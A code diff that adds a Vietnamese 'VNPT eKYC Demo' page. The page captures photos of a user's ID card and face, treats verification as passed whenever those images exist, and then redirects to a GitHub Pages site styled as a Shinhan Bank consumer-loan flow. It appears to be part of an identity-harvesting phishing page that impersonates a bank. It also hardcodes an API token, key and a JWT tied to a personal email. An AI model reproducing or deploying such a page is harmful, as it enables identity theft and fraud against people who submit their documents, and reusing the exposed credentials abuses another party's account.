@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>VNPT eKYC Demo</title>
+  <script src="web-sdk-version-3.1.0.0.js"></script>
+  <script src="./lib/VNPTQRBrowserApp.js"></script>
+  <script src="./lib/VNPTBrowserSDKAppV4.0.0.js"></script>
+  <style>
+    #images-preview {
+      display: none;
+      margin-top: 1rem;
+      text-align: center;
+    }
+    #images-preview img {
+      max-width: 200px;
+      margin: 0.5rem;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+    }
+    #success-message, #error-message {
+      display: none;
+      padding: 1rem;
+      border: 1px solid #ccc;
+      margin-top: 1rem;
+      text-align: center;
+    }
+    button {
+      padding: 0.5rem 1.2rem;
+      font-size: 16px;
+      margin-top: 1rem;
+    }
+  </style>
+</head>
+<body>
+  <div id="ekyc_sdk_intergrated"></div>
+
+  <div id="images-preview">
+    <h3>Ảnh đã chụp</h3>
+    <div>
+      <img id="img-front" alt="Ảnh mặt trước" />
+      <img id="img-back" alt="Ảnh mặt sau" />
+      <img id="img-face" alt="Ảnh chân dung" />
+    </div>
+    <button onclick="goToNextStep()">✅ Xác nhận & Tiếp tục</button>
+  </div>
+
+  <div id="success-message">✅ Xác thực thành công! Đang chuyển bước...</div>
+  <div id="error-message">❌ Xác thực thất bại. Vui lòng thử lại.</div>
+
+  <script>
+    const BACKEND_URL = 'https://api.idg.vnpt.vn';
+    const TOKEN_ID = '38ce3e6d-a751-0560-e063-63199f0a0d77';
+    const TOKEN_KEY = 'MFwwDQYJKoZIhvcNAQEBBQADSwAwSAJBAIFUSvyVXwxbDu3ASYEpWdspsimGUj40i0/L4l0Il5XPOqTvQZ/HJ96AoYFvIT1ZI0f8hpcISQUoyAUuLtgRVgkCAwEAAQ==';
+    const ACCESS_TOKEN = 'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0cmFuc2FjdGlvbl9pZCI6ImIzODZhNjYwLWRjMDYtNDE0ZS1hNTgzLWY3MWYzNzgxYWRjNSIsInN1YiI6IjgzOTVmMzdmLTU1ZDYtMTFmMC1hNThlLTI5NjBkNzZlNTRjOSIsImF1ZCI6WyJyZXN0c2VydmljZSJdLCJ1c2VyX25hbWUiOiJ0bG9jMTc4MTdAZ21haWwuY29tIiwic2NvcGUiOlsicmVhZCJdLCJpc3MiOiJodHRwczovL2xvY2FsaG9zdCIsIm5hbWUiOiJ0bG9jMTc4MTdAZ21haWwuY29tIiwiZXhwIjoxNzUxMzkwNDI2LCJ1dWlkX2FjY291bnQiOiI4Mzk1ZjM3Zi01NWQ2LTExZjAtYTU4ZS0yOTYwZDc2ZTU0YzkiLCJhdXRob3JpdGllcyI6WyJVU0VSIl0sImp0aSI6Ijc5ZTgxMzRlLWNhNjQtNGQ1MS05OGQ4LWRjZmQ5NTI1Njk2YyIsImNsaWVudF9pZCI6ImNsaWVudGFwcCJ9.4wJfGzGzGZgs6OBg9IkU5CZeGfTjK3lxa9xNHE3wdrmsrn9t4ZKmQqV0M_HTwDv-WIzwDzfSftGinrvPghgYACBht4K__krXY9n3mccAqZoSEn8InrKbCORx_QgDPTOUuCdbAlQmc8wYsifXwB97F3-7PpfjycLlSH8YUQ7pDrcLFMRXTnZkGaGe3kFZ4i8izghS2ehTu08fM4u2tLcixQcEOIu1KWfL-pP8sEGRzfZHONTYhCQKxgaUI_HH6gJfrCBSzlZ5h83RjWsgChC58zmRL4Drf23KsLlookITH_Q3Mat4uDnEml70MqjtRGyPeZuu0MELg3f5j7kWnlEbMA';
+
+    const HAS_BACKGROUND_IMAGE = true;
+    const LIST_TYPE_DOCUMENT = [-1, 4, 5, 6, 7];
+
+    const dataConfig = {
+      BACKEND_URL,
+      TOKEN_ID,
+      TOKEN_KEY,
+      ACCESS_TOKEN,
+      CALL_BACK_END_FLOW,
+      HAS_BACKGROUND_IMAGE,
+      LIST_TYPE_DOCUMENT,
+    };
+
+    function goToNextStep() {
+      document.getElementById('images-preview').style.display = 'none';
+      document.getElementById('success-message').style.display = 'block';
+      setTimeout(() => {
+        window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/step4.html';
+      }, 2000);
+    }
+
+    async function CALL_BACK_END_FLOW(result) {
+      console.log("===> Kết quả eKYC:", result);
+
+      // Luôn coi là thành công nếu có ảnh mặt trước và ảnh chân dung
+      const frontImage = result?.ocr?.frontImage;
+      const backImage = result?.ocr?.backImage;
+      const faceImage = result?.face?.image;
+
+      if (!frontImage || !faceImage) {
+        document.getElementById('error-message').style.display = 'block';
+        return;
+      }
+
+      // Gán ảnh vào HTML
+      document.getElementById('img-front').src = frontImage;
+      document.getElementById('img-back').src = backImage || '';
+      document.getElementById('img-face').src = faceImage;
+
+      // Hiển thị khung ảnh
+      document.getElementById('images-preview').style.display = 'block';
+    }
+
+    window.addEventListener('DOMContentLoaded', function () {
+      if (window.SDK) {
+        window.SDK.launch(dataConfig);
+      }
+    });
+  </script>
+</body>
+</html>
